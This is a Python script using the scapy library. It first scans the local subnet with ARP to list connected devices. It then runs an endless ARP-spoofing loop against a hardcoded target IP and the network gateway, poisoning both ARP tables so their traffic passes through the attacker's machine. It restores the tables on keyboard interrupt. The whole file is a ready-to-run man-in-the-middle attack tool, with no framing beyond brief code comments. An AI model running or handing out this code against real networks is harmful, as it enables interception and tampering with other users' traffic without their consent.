#!venv/bin/python3

import scapy.all as scapy
import time 

def network_scan(subnetmask):
    target_ip = scapy.get_if_addr(scapy.conf.iface)
    index = target_ip.rfind('.')
    target_range = target_ip[0:index] + '.0' + subnetmask
    # IP Address for the destination
    # create ARP packet
    arp = scapy.ARP(pdst=target_range)
    # create the Ether broadcast packet
    # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # stack them
    packet = ether/arp

    result = scapy.srp(packet, timeout=3, verbose=1)[0]

    # a list of clients, we will fill this in the upcoming loop
    clients = []

    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

    # print clients
    print("Available devices in the network:")
    print("IP" + " "*18+"MAC")
    for client in clients:
        print("{:16}    {}".format(client['ip'], client['mac']))

def get_gw_ip():
    return scapy.conf.route.route("0.0.0.0")[2]

def spoof(spoof_ip, target_ip):
    packet = scapy.ARP(op = 2, psrc = spoof_ip, hwdst = scapy.getmacbyip(target_ip), pdst = target_ip) #implied my mac for hwsrc
    scapy.send(packet, verbose = False)

def restore(src_ip, target_ip):
    packet = scapy.ARP(op = 2, psrc = src_ip, hwsrc = scapy.getmacbyip(src_ip), hwdst = scapy.getmacbyip(target_ip), pdst = target_ip) #op is response
    scapy.send(packet, verbose = False)

if __name__ == '__main__':
    # network_scan('/16')
    gw_ip = get_gw_ip()
    target = '10.1.4.171'
    packets_sent = 0
    frequency = 1 #seconds
    while(1):
        try: 
            spoof(gw_ip, target) #tell the target that the router is associated with my mac address
            spoof(target, gw_ip) #tell the router that the target is associated with my mac address
            packets_sent = packets_sent + 2
            print(f'{packets_sent} updates to ARP tables.')
            time.sleep(frequency)
        except KeyboardInterrupt:
            print('\nRestoring original ARP tables...')
            restore(gw_ip, target) 
            restore(target, gw_ip)
            print('Restored. Exiting.')
            exit(0)

